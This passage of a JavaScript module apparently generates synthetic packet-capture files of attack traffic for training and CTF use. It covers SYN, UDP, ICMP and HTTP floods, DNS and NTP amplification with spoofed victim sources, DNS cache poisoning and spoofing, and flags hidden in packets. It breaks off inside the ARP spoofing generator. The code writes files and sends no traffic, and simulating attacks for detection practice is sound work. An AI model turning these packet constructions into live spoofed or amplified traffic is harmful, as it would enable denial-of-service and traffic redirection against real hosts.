import { 
  PcapWriter, 
  EthernetFrame, 
  IPv4Packet, 
  TcpPacket, 
  UdpPacket, 
  IcmpPacket,
  DnsPacket,
  HttpPacket 
} from './pcap-builder.js'

// TCP flags
const TCP_FLAGS = {
  FIN: 0x01,
  SYN: 0x02,
  RST: 0x04,
  PSH: 0x08,
  ACK: 0x10,
  URG: 0x20
}

// Protocol numbers
const PROTO = {
  ICMP: 1,
  TCP: 6,
  UDP: 17
}

export async function generatePcap(attackType, config) {
  const generators = {
    dos: generateDoSAttack,
    ddos: generateDDoSAttack,
    dns_spoofing: generateDnsSpoofing,
    arp_spoofing: generateArpSpoofing,
    port_scan: generatePortScan,
    mitm: generateMitm,
    sql_injection: generateSqlInjection,
    xss: generateXss,
    malware_download: generateMalwareDownload
  }

  const generator = generators[attackType]
  if (!generator) {
    throw new Error(`Unknown attack type: ${attackType}`)
  }

  return generator(config)
}

export async function generateScenarioPcap(scenario) {
  const { timelineMinutes = 30, attacks = [] } = scenario || {}
  const pcap = new PcapWriter()
  const baseTime = Date.now()

  // For each attack in the scenario, generate its packets and add with offset
  for (const item of attacks) {
    const { attackType, config, startMinute = 0 } = item
    const startOffset = startMinute * 60 * 1000

    // Generate PCAP buffer from existing generator
    const buffer = await generatePcap(attackType, config)

    // Parse PCAP buffer to extract packets and re-timestamp them
    // PCAP format: global header (24 bytes) + packets (16 byte header + data each)
    let offset = 24 // Skip global header
    let firstPacketTimestamp = null
    
    try {
      while (offset < buffer.length) {
        // Read packet header (16 bytes)
        if (offset + 16 > buffer.length) break
        
        const seconds = buffer.readUInt32LE(offset)
        const microseconds = buffer.readUInt32LE(offset + 4)
        const capturedLength = buffer.readUInt32LE(offset + 8)
        
        if (offset + 16 + capturedLength > buffer.length) break
        
        // Extract packet data
        const packetData = buffer.subarray(offset + 16, offset + 16 + capturedLength)
        
        // Reconstruct original timestamp
        const originalTimestamp = seconds * 1000 + Math.floor(microseconds / 1000)
        
        // Track the first packet's timestamp as the baseline for relative offsets
        if (firstPacketTimestamp === null) {
          firstPacketTimestamp = originalTimestamp
        }
        
        // Compute new timestamp: scenario base + attack start offset + relative position within attack
        const relativeOffset = originalTimestamp - firstPacketTimestamp
        const newTimestamp = baseTime + startOffset + relativeOffset
        
        // Add to scenario PCAP with new timestamp
        pcap.addPacket(newTimestamp, packetData)
        
        offset += 16 + capturedLength
      }
    } catch (error) {
      console.error(`Error parsing packets for ${attackType}:`, error)
    }
  }

  return pcap.build()
}

function generateDoSAttack(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const srcMac = '00:06:5B:EB:03:E0'
  const dstMac = '00:EE:0D:BE:EF:F8'
  
  const intensity = {
    low: 100,
    medium: 1000,
    high: 10000
  }[config.intensity]

  const packetsPerSecond = intensity
  const totalPackets = Math.min(packetsPerSecond * config.duration, 100000) // Cap at 100k packets

  console.log(`Generating ${totalPackets} DoS packets...`)

  // Generate legitimate traffic before attack
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - (config.duration * 1000 * 0.3), srcMac, dstMac, config, legitimateCountBefore, config.duration * 1000 * 0.3)
  }

  // Generate attack based on variant
  switch (config.variant) {
    case 'SYN Flood':
      generateSynFlood(pcap, baseTime, srcMac, dstMac, config, totalPackets)
      break
    case 'UDP Flood':
      generateUdpFlood(pcap, baseTime, srcMac, dstMac, config, totalPackets)
      break
    case 'ICMP Flood':
      generateIcmpFlood(pcap, baseTime, srcMac, dstMac, config, totalPackets)
      break
    case 'HTTP Flood':
      generateHttpFlood(pcap, baseTime, srcMac, dstMac, config, totalPackets)
      break
  }

  // Generate legitimate traffic after attack
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    const afterTime = baseTime + (config.duration * 1000)
    generateLegitimateTraffic(pcap, afterTime, srcMac, dstMac, config, legitimateCountAfter, config.duration * 1000 * 0.3)
  }

  return pcap.build()
}

export async function generateCtfPcap(ctf) {
  const { name = 'CTF', difficulty = 'Medium', flags = [], background = {} } = ctf || {}
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const srcMac = '00:11:22:33:44:55'
  const dstMac = 'AA:BB:CC:DD:EE:FF'
  const clientIp = '192.168.1.100'
  const serverIp = '93.184.216.34' // example.com

  let timestamp = baseTime

  // Difficulty influences obfuscation or spread
  const spread = {
    Easy: 1,
    Medium: 3,
    Hard: 5,
    Expert: 8
  }[difficulty] || 3

  for (const flag of flags) {
    const { flag: flagText, hideIn, payload = '' } = flag

    // Optionally generate background traffic BEFORE the flag
    if (background?.include && (background.windowSec ?? 0) > 0) {
      const preWindow = Math.floor((background.windowSec || 0) / 2)
      const count = backgroundLevelToCount(background.level, preWindow)
      if (count > 0 && preWindow > 0) {
        const cfg = { duration: preWindow, targetIp: serverIp }
        generateLegitimateTraffic(pcap, timestamp - preWindow * 1000, srcMac, dstMac, cfg, count)
      }
    }

    switch (hideIn) {
      case 'HTTP Headers': {
        const httpReq = HttpPacket.buildRequest('GET', '/challenge', 'example.com', {
          'User-Agent': 'Mozilla/5.0',
          'X-Flag': flagText,
          ...(payload ? { 'X-Note': payload } : {})
        })
        const tcpReq = TcpPacket.build(54321, 80, 1000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
        const ipReq = IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpReq)
        const ethReq = EthernetFrame.build(srcMac, dstMac, 0x0800, ipReq)
        pcap.addPacket(timestamp, ethReq)
        timestamp += 10
        break
      }

      case 'DNS Query': {
        const encoded = flagText.replace(/\{/g, '').replace(/\}/g, '').toLowerCase()
        const name = `${encoded}.flag.ctf.example.com`
        const query = DnsPacket.build(Math.floor(Math.random() * 65535), 0x0100, [
          { name, type: 16, class: 1 } // TXT record query
        ])
        const udpQuery = UdpPacket.build(53000, 53, query)
        const ipQuery = IPv4Packet.build(clientIp, '8.8.8.8', PROTO.UDP, udpQuery)
        const ethQuery = EthernetFrame.build(srcMac, dstMac, 0x0800, ipQuery)
        pcap.addPacket(timestamp, ethQuery)
        timestamp += 10
        break
      }

      case 'ICMP Data': {
        const data = Buffer.from(flagText, 'utf-8')
        const icmpPayload = IcmpPacket.build(8, 0, data)
        const ipPacket = IPv4Packet.build(clientIp, serverIp, PROTO.ICMP, icmpPayload)
        const ethFrame = EthernetFrame.build(srcMac, dstMac, 0x0800, ipPacket)
        pcap.addPacket(timestamp, ethFrame)
        timestamp += 10
        break
      }

      case 'TCP Payload': {
        const body = payload ? `${payload}\n${flagText}` : flagText
        const httpResp = HttpPacket.buildResponse(200, 'OK', { 'Content-Type': 'text/plain' }, body)
        const tcpResp = TcpPacket.build(80, 54322, 2000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
        const ipResp = IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpResp)
        const ethResp = EthernetFrame.build(dstMac, srcMac, 0x0800, ipResp)
        pcap.addPacket(timestamp, ethResp)
        timestamp += 10
        break
      }

      case 'Encoded in Multiple Packets': {
        // Spread flag across multiple small TCP payloads
        const parts = []
        const chunkSize = Math.max(1, Math.ceil(flagText.length / (3 * spread)))
        for (let i = 0; i < flagText.length; i += chunkSize) {
          parts.push(flagText.slice(i, i + chunkSize))
        }
        let seq = Math.floor(Math.random() * 4294967295)
        for (const part of parts) {
          const payloadBuf = Buffer.from(part, 'utf-8')
          const tcp = TcpPacket.build(54325, 80, seq, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, payloadBuf)
          const ip = IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcp)
          const eth = EthernetFrame.build(srcMac, dstMac, 0x0800, ip)
          pcap.addPacket(timestamp, eth)
          timestamp += 5
          seq += payloadBuf.length
        }
        break
      }
    }

    // Optionally generate background traffic AFTER the flag
    if (background?.include && (background.windowSec ?? 0) > 0) {
      const postWindow = Math.ceil((background.windowSec || 0) / 2)
      const count = backgroundLevelToCount(background.level, postWindow)
      if (count > 0 && postWindow > 0) {
        const cfg = { duration: postWindow, targetIp: serverIp }
        generateLegitimateTraffic(pcap, timestamp, srcMac, dstMac, cfg, count)
      }
    }
  }

  return pcap.build()
}

function backgroundLevelToCount(level, windowSec) {
  // Packets per second approximations -> count for given window
  const pps = {
    Low: 5,
    Medium: 10,
    High: 20
  }[level || 'Medium'] || 10
  return Math.max(0, Math.floor(pps * Math.max(0, windowSec)))
}

function generateSynFlood(pcap, baseTime, srcMac, dstMac, config, count) {
  for (let i = 0; i < count; i++) {
    const timestamp = baseTime + (i * 1000 / (count / config.duration))
    const srcPort = 1024 + Math.floor(Math.random() * 64000)
    const seq = Math.floor(Math.random() * 4294967295)
    
    // SYN floods use spoofed random source IPs
    const spoofedIp = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 254) + 1}`
    const spoofedMac = `02:${Math.floor(Math.random()*256).toString(16).padStart(2,'0')}:${Math.floor(Math.random()*256).toString(16).padStart(2,'0')}:${Math.floor(Math.random()*256).toString(16).padStart(2,'0')}:${Math.floor(Math.random()*256).toString(16).padStart(2,'0')}:${Math.floor(Math.random()*256).toString(16).padStart(2,'0')}`
    
    const tcpPayload = TcpPacket.build(srcPort, config.port, seq, 0, TCP_FLAGS.SYN)
    const ipPacket = IPv4Packet.build(spoofedIp, config.targetIp, PROTO.TCP, tcpPayload)
    const ethFrame = EthernetFrame.build(spoofedMac, dstMac, 0x0800, ipPacket)
    pcap.addPacket(timestamp, ethFrame)
    
    // Server sends SYN-ACK initially, then stops as it gets overwhelmed
    if (i < count * 0.25) {
      const synAck = TcpPacket.build(config.port, srcPort, Math.floor(Math.random() * 4294967295), seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
      const ipResp = IPv4Packet.build(config.targetIp, spoofedIp, PROTO.TCP, synAck)
      const ethResp = EthernetFrame.build(dstMac, spoofedMac, 0x0800, ipResp)
      pcap.addPacket(timestamp + 1, ethResp)
    }
  }
}

function generateUdpFlood(pcap, baseTime, srcMac, dstMac, config, count) {
  const payloadSizes = [64, 128, 256, 512, 1024, 1400]
  for (let i = 0; i < count; i++) {
    const timestamp = baseTime + (i * 1000 / (count / config.duration))
    const srcPort = 1024 + Math.floor(Math.random() * 64000)
    const targetPort = config.port || (Math.floor(Math.random() * 64000) + 1024)
    
    // Vary payload sizes and content for realism
    const size = payloadSizes[Math.floor(Math.random() * payloadSizes.length)]
    const payload = Buffer.alloc(size)
    for (let j = 0; j < size; j++) payload[j] = Math.floor(Math.random() * 256)
    
    const udpPayload = UdpPacket.build(srcPort, targetPort, payload)
    const ipPacket = IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.UDP, udpPayload)
    const ethFrame = EthernetFrame.build(srcMac, dstMac, 0x0800, ipPacket)
    pcap.addPacket(timestamp, ethFrame)
    
    // ~10% of packets get ICMP Destination Unreachable (port unreachable)
    if (Math.random() < 0.1) {
      const icmpData = Buffer.alloc(28)
      ipPacket.copy(icmpData, 0, 0, Math.min(28, ipPacket.length))
      const icmpResp = IcmpPacket.build(3, 3, icmpData)
      const ipResp = IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.ICMP, icmpResp)
      const ethResp = EthernetFrame.build(dstMac, srcMac, 0x0800, ipResp)
      pcap.addPacket(timestamp + 2, ethResp)
    }
  }
}

function generateIcmpFlood(pcap, baseTime, srcMac, dstMac, config, count) {
  for (let i = 0; i < count; i++) {
    const timestamp = baseTime + (i * 1000 / (count / config.duration))
    
    // Realistic ping payload with incrementing sequence and timestamp-like data
    const payload = Buffer.alloc(56)
    payload.writeUInt32BE(Math.floor(timestamp / 1000), 0)
    payload.writeUInt32BE((timestamp % 1000) * 1000, 4)
    for (let j = 8; j < 56; j++) payload[j] = j & 0xff
    
    const icmpPayload = IcmpPacket.build(8, 0, payload)
    const ipPacket = IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.ICMP, icmpPayload)
    const ethFrame = EthernetFrame.build(srcMac, dstMac, 0x0800, ipPacket)
    pcap.addPacket(timestamp, ethFrame)
    
    // Server responds initially with Echo Reply, then stops (overwhelmed)
    if (i < count * 0.15) {
      const replyPayload = IcmpPacket.build(0, 0, payload)
      const ipReply = IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.ICMP, replyPayload)
      const ethReply = EthernetFrame.build(dstMac, srcMac, 0x0800, ipReply)
      pcap.addPacket(timestamp + 3, ethReply)
    }
  }
}

function generateHttpFlood(pcap, baseTime, srcMac, dstMac, config, count) {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
  ]
  const paths = ['/', '/index.html', '/login', '/api/data', '/search?q=test', '/products', '/about', '/contact', '/static/main.css', '/images/banner.jpg']
  
  for (let i = 0; i < count; i++) {
    const timestamp = baseTime + (i * 1000 / (count / config.duration))
    const srcPort = 1024 + Math.floor(Math.random() * 64000)
    const seq = Math.floor(Math.random() * 4294967295)
    
    const httpRequest = HttpPacket.buildRequest('GET', paths[Math.floor(Math.random() * paths.length)], config.targetIp, {
      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive'
    })
    
    const tcpPayload = TcpPacket.build(srcPort, config.port, seq, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpRequest)
    const ipPacket = IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpPayload)
    const ethFrame = EthernetFrame.build(srcMac, dstMac, 0x0800, ipPacket)
    pcap.addPacket(timestamp, ethFrame)
    
    // Server responds: 200 initially, then 503 Service Unavailable as it's overwhelmed
    if (i < count * 0.3 || Math.random() < 0.05) {
      const statusCode = i < count * 0.25 ? 200 : 503
      const statusText = statusCode === 200 ? 'OK' : 'Service Unavailable'
      const body = statusCode === 200 ? '<html><body>OK</body></html>' : '<html><body>Service Temporarily Unavailable</body></html>'
      const httpResp = HttpPacket.buildResponse(statusCode, statusText, {
        'Content-Type': 'text/html',
        'Server': 'nginx/1.24.0'
      }, body)
      const tcpResp = TcpPacket.build(config.port, srcPort, Math.floor(Math.random() * 4294967295), seq + httpRequest.length, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      const ipResp = IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpResp)
      const ethResp = EthernetFrame.build(dstMac, srcMac, 0x0800, ipResp)
      pcap.addPacket(timestamp + 5, ethResp)
    }
  }
}

function generateDDoSAttack(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const dstMac = 'AA:BB:CC:DD:EE:FF'

  const intensity = { low: 10, medium: 100, high: 1000 }[config.intensity] || 100
  const totalPackets = Math.min(intensity * config.duration, 50000)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - (config.duration * 1000 * 0.3), '00:06:5B:EB:03:E0', dstMac, config, legitimateCountBefore, config.duration * 1000 * 0.3)
  }

  switch (config.variant) {
    case 'DNS Amplification':
      generateDnsAmplification(pcap, baseTime, dstMac, config, totalPackets)
      break
    case 'NTP Amplification':
      generateNtpAmplification(pcap, baseTime, dstMac, config, totalPackets)
      break
    case 'Botnet SYN Flood':
    default:
      generateBotnetSynFlood(pcap, baseTime, dstMac, config, totalPackets)
      break
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    const afterTime = baseTime + (config.duration * 1000)
    generateLegitimateTraffic(pcap, afterTime, '00:06:5B:EB:03:E0', dstMac, config, legitimateCountAfter, config.duration * 1000 * 0.3)
  }

  return pcap.build()
}

function generateBotnetSynFlood(pcap, baseTime, dstMac, config, totalPackets) {
  const botnetSize = 50
  const sourceIps = []
  for (let i = 0; i < botnetSize; i++) {
    sourceIps.push(`${Math.floor(Math.random() * 200) + 10}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 254) + 1}`)
  }

  console.log(`Generating Botnet SYN Flood from ${botnetSize} sources (${totalPackets} packets)...`)

  for (let i = 0; i < totalPackets; i++) {
    const botIdx = i % botnetSize
    const sourceIp = sourceIps[botIdx]
    const srcMac = `02:${(botIdx & 0xff).toString(16).padStart(2, '0')}:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}`
    const timestamp = baseTime + (i * 1000 / (totalPackets / config.duration))
    const srcPort = 1024 + Math.floor(Math.random() * 64000)
    const seq = Math.floor(Math.random() * 4294967295)

    const tcpPayload = TcpPacket.build(srcPort, config.port, seq, 0, TCP_FLAGS.SYN)
    const ipPacket = IPv4Packet.build(sourceIp, config.targetIp, PROTO.TCP, tcpPayload)
    const ethFrame = EthernetFrame.build(srcMac, dstMac, 0x0800, ipPacket)
    pcap.addPacket(timestamp, ethFrame)

    // Server responds with SYN-ACK initially, then stops (overwhelmed)
    if (i < totalPackets * 0.15) {
      const synAck = TcpPacket.build(config.port, srcPort, Math.floor(Math.random() * 4294967295), seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
      const ipResp = IPv4Packet.build(config.targetIp, sourceIp, PROTO.TCP, synAck)
      const ethResp = EthernetFrame.build(dstMac, srcMac, 0x0800, ipResp)
      pcap.addPacket(timestamp + 1, ethResp)
    }
  }
}

function generateDnsAmplification(pcap, baseTime, dstMac, config, totalPackets) {
  // DNS amplification: small queries with spoofed source (victim) → large amplified responses flood victim
  const resolvers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '208.67.222.222', '9.9.9.9']
  const queryDomains = ['dnsamplification.test', 'isc.org', 'ripe.net', 'example.com']

  console.log(`Generating DNS Amplification DDoS (${totalPackets} packets)...`)

  for (let i = 0; i < totalPackets; i++) {
    const timestamp = baseTime + (i * 1000 / (totalPackets / config.duration))
    const resolver = resolvers[i % resolvers.length]
    const resolverMac = `AA:${(i % 256).toString(16).padStart(2, '0')}:BB:CC:DD:${((i + 50) % 256).toString(16).padStart(2, '0')}`
    const txId = Math.floor(Math.random() * 65535)
    const domain = queryDomains[Math.floor(Math.random() * queryDomains.length)]

    // Small query with spoofed source = victim IP
    const query = DnsPacket.build(txId, 0x0100, [
      { name: domain, type: 255, class: 1 } // ANY query for maximum amplification
    ])
    const udpQuery = UdpPacket.build(Math.floor(Math.random() * 64000) + 1024, 53, query)
    const ipQuery = IPv4Packet.build(config.targetIp, resolver, PROTO.UDP, udpQuery) // Source = victim (spoofed)
    const ethQuery = EthernetFrame.build('02:00:00:00:00:01', resolverMac, 0x0800, ipQuery)
    pcap.addPacket(timestamp, ethQuery)

    // Large amplified DNS response sent to victim (amplification factor ~50x)
    const largeData = Buffer.alloc(450)
    for (let j = 0; j < 450; j++) largeData[j] = Math.floor(Math.random() * 256)
    const response = DnsPacket.build(txId, 0x8580,
      [{ name: domain, type: 255, class: 1 }],
      [
        { name: domain, type: 1, class: 1, ttl: 300, data: Buffer.from([93, 184, 216, 34]) },
        { name: domain, type: 16, class: 1, ttl: 300, data: largeData }
      ]
    )
    const udpResp = UdpPacket.build(53, Math.floor(Math.random() * 64000) + 1024, response)
    const ipResp = IPv4Packet.build(resolver, config.targetIp, PROTO.UDP, udpResp)
    const ethResp = EthernetFrame.build(resolverMac, dstMac, 0x0800, ipResp)
    pcap.addPacket(timestamp + 2, ethResp)
  }
}

function generateNtpAmplification(pcap, baseTime, dstMac, config, totalPackets) {
  // NTP amplification: small monlist request → large response (~600x amplification factor)
  const ntpServers = ['129.6.15.28', '132.163.97.1', '216.239.35.0', '162.159.200.1']

  console.log(`Generating NTP Amplification DDoS (${totalPackets} packets)...`)

  for (let i = 0; i < totalPackets; i++) {
    const timestamp = baseTime + (i * 1000 / (totalPackets / config.duration))
    const server = ntpServers[i % ntpServers.length]
    const serverMac = `AA:${(i % 256).toString(16).padStart(2, '0')}:CC:DD:EE:${((i + 30) % 256).toString(16).padStart(2, '0')}`

    // Small monlist request (8 bytes) with spoofed source = victim
    const monlistReq = Buffer.alloc(8)
    monlistReq[0] = 0x17 // NTP version 2, mode 7 (private)
    monlistReq[1] = 0x00 // Implementation
    monlistReq[2] = 0x2a // Request code: MON_GETLIST_1 (42)
    const udpReq = UdpPacket.build(Math.floor(Math.random() * 64000) + 1024, 123, monlistReq)
    const ipReq = IPv4Packet.build(config.targetIp, server, PROTO.UDP, udpReq) // Source = victim (spoofed)
    const ethReq = EthernetFrame.build('02:00:00:00:00:01', serverMac, 0x0800, ipReq)
    pcap.addPacket(timestamp, ethReq)

    // Large amplified NTP response (~480 bytes) sent to victim
    const monlistResp = Buffer.alloc(480)
    monlistResp[0] = 0x97 // Response bit set, version 2, mode 7
    monlistResp[1] = 0x00
    monlistResp[2] = 0x2a // Request code echoed
    monlistResp[3] = 0x06 // 6 entries
    for (let j = 8; j < 480; j++) monlistResp[j] = Math.floor(Math.random() * 256)
    const udpResp = UdpPacket.build(123, Math.floor(Math.random() * 64000) + 1024, monlistResp)
    const ipResp = IPv4Packet.build(server, config.targetIp, PROTO.UDP, udpResp)
    const ethResp = EthernetFrame.build(serverMac, dstMac, 0x0800, ipResp)
    pcap.addPacket(timestamp + 2, ethResp)
  }
}

function generateDnsSpoofing(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const clientMac = '00:06:5B:EB:03:E0'
  const gatewayMac = '0E:B6:01:D2:EE:01'
  const attackerMac = '0E:56:5F:B2:01:A0'
  const clientIp = '192.168.1.100'
  const dnsServer = '8.8.8.8'
  const spoofedIp = '10.0.0.1' // Attacker-controlled IP
  const realIp = Buffer.from([93, 184, 216, 34])
  const spoofedIpBuf = Buffer.from([10, 0, 0, 1])
  const domains = ['example.com', 'bank-login.com', 'secure-site.org', 'webmail.example.com']

  console.log(`Generating DNS spoofing attack (${config.variant})...`)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 10000, clientMac, gatewayMac, config, legitimateCountBefore, 5000)
  }

  let timestamp = baseTime

  if (config.variant === 'Cache Poisoning') {
    // Cache poisoning: flood of spoofed DNS responses with different transaction IDs
    // Attacker tries to guess the transaction ID of a pending legitimate query

    // Legitimate DNS query from client
    const realTxId = 0x4B2A
    const query = DnsPacket.build(realTxId, 0x0100, [
      { name: 'bank-login.com', type: 1, class: 1 }
    ])
    const udpQuery = UdpPacket.build(54321, 53, query)
    const ipQuery = IPv4Packet.build(clientIp, dnsServer, PROTO.UDP, udpQuery)
    const ethQuery = EthernetFrame.build(clientMac, gatewayMac, 0x0800, ipQuery)
    pcap.addPacket(timestamp, ethQuery)
    timestamp += 1

    // Attacker floods spoofed responses with guessed transaction IDs
    for (let i = 0; i < 200; i++) {
      const guessedTxId = (0x4B00 + i) & 0xFFFF
      const poisonResp = DnsPacket.build(guessedTxId, 0x8180,
        [{ name: 'bank-login.com', type: 1, class: 1 }],
        [{ name: 'bank-login.com', type: 1, class: 1, ttl: 86400, data: spoofedIpBuf }]
      )
      const udpPoison = UdpPacket.build(53, 54321, poisonResp)
      const ipPoison = IPv4Packet.build(dnsServer, clientIp, PROTO.UDP, udpPoison)
      const ethPoison = EthernetFrame.build(gatewayMac, clientMac, 0x0800, ipPoison)
      pcap.addPacket(timestamp, ethPoison)
      timestamp += 0.5
    }

    // Real response arrives after the flood (too late)
    const realResp = DnsPacket.build(realTxId, 0x8180,
      [{ name: 'bank-login.com', type: 1, class: 1 }],
      [{ name: 'bank-login.com', type: 1, class: 1, ttl: 300, data: realIp }]
    )
    const udpReal = UdpPacket.build(53, 54321, realResp)
    const ipReal = IPv4Packet.build(dnsServer, clientIp, PROTO.UDP, udpReal)
    const ethReal = EthernetFrame.build(gatewayMac, clientMac, 0x0800, ipReal)
    pcap.addPacket(timestamp + 50, ethReal)

    // Client connects to poisoned IP
    timestamp += 100
    const httpReq = HttpPacket.buildRequest('GET', '/login', 'bank-login.com', {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    })
    const tcpReq = TcpPacket.build(54400, 80, 1000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
    const ipReq = IPv4Packet.build(clientIp, spoofedIp, PROTO.TCP, tcpReq)
    const ethReq = EthernetFrame.build(clientMac, attackerMac, 0x0800, ipReq)
    pcap.addPacket(timestamp, ethReq)

  } else {
    // Basic Spoofing: multiple DNS queries, each gets a spoofed response before the real one

    for (let d = 0; d < domains.length; d++) {
      const domain = domains[d]
      const txId = 0x1234 + d

      // Client DNS query
      const query = DnsPacket.build(txId, 0x0100, [
        { name: domain, type: 1, class: 1 }
      ])
      const udpQuery = UdpPacket.build(54321 + d, 53, query)
      const ipQuery = IPv4Packet.build(clientIp, dnsServer, PROTO.UDP, udpQuery)
      const ethQuery = EthernetFrame.build(clientMac, gatewayMac, 0x0800, ipQuery)
      pcap.addPacket(timestamp, ethQuery)

      // Spoofed response (from attacker, arrives first)
      const spoofedAnswer = DnsPacket.build(txId, 0x8180,
        [{ name: domain, type: 1, class: 1 }],
        [{ name: domain, type: 1, class: 1, ttl: 300, data: spoofedIpBuf }]
      )
      const udpSpoof = UdpPacket.build(53, 54321 + d, spoofedAnswer)
      const ipSpoof = IPv4Packet.build(config.sourceIp, clientIp, PROTO.UDP, udpSpoof)
      const ethSpoof = EthernetFrame.build(attackerMac, clientMac, 0x0800, ipSpoof)
      pcap.addPacket(timestamp + 3, ethSpoof)

      // Real response (arrives late)
      const realAnswer = DnsPacket.build(txId, 0x8180,
        [{ name: domain, type: 1, class: 1 }],
        [{ name: domain, type: 1, class: 1, ttl: 300, data: realIp }]
      )
      const udpReal = UdpPacket.build(53, 54321 + d, realAnswer)
      const ipReal = IPv4Packet.build(dnsServer, clientIp, PROTO.UDP, udpReal)
      const ethReal = EthernetFrame.build(gatewayMac, clientMac, 0x0800, ipReal)
      pcap.addPacket(timestamp + 40, ethReal)

      // Client connects to spoofed IP
      const httpReq = HttpPacket.buildRequest('GET', '/', domain, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
      })
      const tcpReq = TcpPacket.build(54400 + d, 80, 1000 + d * 1000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      const ipReq = IPv4Packet.build(clientIp, spoofedIp, PROTO.TCP, tcpReq)
      const ethReq = EthernetFrame.build(clientMac, attackerMac, 0x0800, ipReq)
      pcap.addPacket(timestamp + 60, ethReq)

      timestamp += 2000
    }
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, timestamp + 1000, clientMac, gatewayMac, config, legitimateCountAfter, 5000)
  }

  return pcap.build()
}

function generateArpSpoofing(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()

  console.log(`Generating ARP spoofing attack (${config.variant})...`)

  const attackerMac = '0E:56:5F:B2:01:A0'
  const victimMac = '00:06:5B:EB:03:E0'
  const gatewayMac = '0E:B6:01:D2:EE:01'
  const gatewayIp = '192.168.1.1'
  const victimIp = '192.168.1.100'
  const broadcastMac = 'FF:FF:FF:FF:FF:FF'

  // ARP packet builder (local)
  function buildArpPacket(senderMac, senderIp, targetMac, targetIp, opcode) {
    const packet = Buffer.alloc(28)
    packet.writeUInt16BE(0x0001, 0) // Hardware type (Ethernet)
    packet.writeUInt16BE(0x0800, 2) // Protocol type (IPv4)
    packet[4] = 6 // Hardware address length
    packet[5] = 4 // Protocol address length
    packet.writeUInt16BE(opcode, 6) // Operation
    const senderMacBytes = senderMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) packet[8 + i] = senderMacBytes[i]
    const senderIpBytes = senderIp.split('.').map(b => parseInt(b))
    for (let i = 0; i < 4; i++) packet[14 + i] = senderIpBytes[i]
    const targetMacBytes = targetMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) packet[18 + i] = targetMacBytes[i]
    const targetIpBytes = targetIp.split('.').map(b => parseInt(b))
    for (let i = 0; i < 4; i++) packet[24 + i] = targetIpBytes[i]
    return packet
  }

  function buildArpFrame(srcMac, dstMac, arpPacket) {
    const frame = Buffer.alloc(14 + arpPacket.length)
    const dstMacBytes = dstMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) frame[i] = dstMacBytes[i]
    const srcMacBytes = srcMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) frame[6 + i] = srcMacBytes[i]
